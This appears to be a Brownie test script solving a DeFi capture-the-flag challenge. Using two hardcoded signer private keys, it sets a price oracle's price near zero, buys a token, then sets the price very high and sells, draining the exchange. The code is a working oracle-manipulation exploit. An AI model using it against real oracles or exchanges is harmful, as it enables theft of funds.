from web3 import Web3
from brownie import accounts, Wei
from time import sleep
from scripts.Oracle_helper import *
#import brownie
#import pytest

#@pytest.fixture
def test_deploy():
    yellow ='\x1b[0;33m'
    green ='\x1b[0;32m'
    red='\x1b[0;31m'
    nocolor='\x1b[0;m'

    # Adding 100 accounts
    print(red,"\r[ * ] \x1b[0;43m0xm4ud ORACLE Attacker 3000\x1b[0;m")
    print(red,"\r[ * ]\x1b[0;m RICKY BOBBY says: I WANNA PREDICT FAST!!!",nocolor)

    # Web3 instance
    w3 = Web3(Web3.HTTPProvider())

    #Deploy RainbowAllianceToken
    print(green,"\r[ + ]\x1b[0;m Deploying Token, Oracle and Exchange",nocolor)
    # deploying the token
    token.transferOwnership(exchange.address, {'from': deployer, 'gas_price': '19 gwei'})


def test_attack():
    # Garbage copilot sugestion..
    buyPrice = Wei('0.00000000001 ether')
    sellPrice = Wei('1800 ether')

    key1 = "0x221b93d924f48fcf998c7f20b4be36d12eb1d637a8f49e6e76c154f105e882af"
    key2 = "0x390e61fd668d2cf6db3305df8dc5366ed53d58610cee715c57dfd9f780579344"

    signer1 = accounts.add(key1)
    signer2 = accounts.add(key2)

    #Reduce the price, buy 1 gold token
    oracle.postPrice(buyPrice, {'from': signer1, 'gas_price': '19 gwei'})
    oracle.postPrice(buyPrice, {'from': signer2, 'gas_price': '19 gwei'})
    exchange.buyTokens(1, {'from': attacker, 'gas_price': '19 gwei', 'value': buyPrice})

    #Increase the price, sell 1 gold token
    oracle.postPrice(sellPrice, {'from': signer1, 'gas_price': '19 gwei'})
    oracle.postPrice(sellPrice, {'from': signer2, 'gas_price': '19 gwei'})
    exchange.sellTokens(1, {'from': attacker, 'gas_price': '19 gwei'})

    # Revert to initial price
    oracle.postPrice(INITIAL_GOLD_PRICE, {'from': signer1, 'gas_price': '19 gwei'})
    oracle.postPrice(INITIAL_GOLD_PRICE, {'from': signer2, 'gas_price': '19 gwei'})

    # Assert success
    assert(exchange.balance() < Wei('0.1 ether'))

    assert(attacker.balance() > initialAttackerBalance + EXCHANGE_INITIAL_BALANCE - Wei('0.2 ethers'))

    assert(oracle.getPrice() == INITIAL_GOLD_PRICE)